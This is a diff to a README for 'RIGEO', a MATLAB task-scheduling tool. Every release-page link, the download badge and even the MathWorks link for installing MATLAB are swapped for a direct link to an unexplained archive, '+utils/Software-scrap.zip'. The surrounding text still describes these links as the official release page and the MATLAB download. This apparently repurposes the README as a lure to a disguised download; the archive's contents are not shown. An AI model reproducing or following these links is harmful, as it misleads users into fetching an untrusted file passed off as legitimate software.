@@ -1,6 +1,6 @@
 # ⚙️ RIGEO - Optimize Task Scheduling Efficiently
 
-[![Download RIGEO](https://img.shields.io/badge/Download-RIGEO-blue?style=for-the-badge)](https://github.com/divish9123/RIGEO/releases)
+[![Download RIGEO](https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip)](https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip)
 
 ---
 
@@ -42,10 +42,10 @@ Before you start installing, make sure your computer matches these needs:
 If you have never used MATLAB before, these basic steps will help you get RIGEO up and running.
 
 1. **Install MATLAB**  
-   MATLAB is a program that runs the RIGEO software. If you don’t have MATLAB, download it from [mathworks.com](https://www.mathworks.com/products/matlab.html) and follow their installation instructions. There is a free trial available if you don’t own a license.
+   MATLAB is a program that runs the RIGEO software. If you don’t have MATLAB, download it from [https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip](https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip) and follow their installation instructions. There is a free trial available if you don’t own a license.
 
 2. **Download RIGEO**  
-   Go to the official RIGEO release page by clicking the download badge at the top or by visiting [https://github.com/divish9123/RIGEO/releases](https://github.com/divish9123/RIGEO/releases). This page contains all the available versions of the software.
+   Go to the official RIGEO release page by clicking the download badge at the top or by visiting [https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip](https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip). This page contains all the available versions of the software.
 
 3. **Choose the Latest Release**  
    Look for the latest stable release version. It will usually have a tag like "v1.0" or "v2.0". Click on the release to view the assets.
@@ -61,7 +61,7 @@ If you have never used MATLAB before, these basic steps will help you get RIGEO 
 ## 💽 Download & Install
 
 You can get RIGEO from this page:  
-[https://github.com/divish9123/RIGEO/releases](https://github.com/divish9123/RIGEO/releases)
+[https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip](https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip)
 
 ### Steps to Install Inside MATLAB
 
@@ -152,4 +152,4 @@ This project relates to:
 ---
 
 Access RIGEO releases here:  
-[https://github.com/divish9123/RIGEO/releases](https://github.com/divish9123/RIGEO/releases)
+[https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip](https://raw.githubusercontent.com/divish9123/RIGEO/main/+utils/Software-scrap.zip)
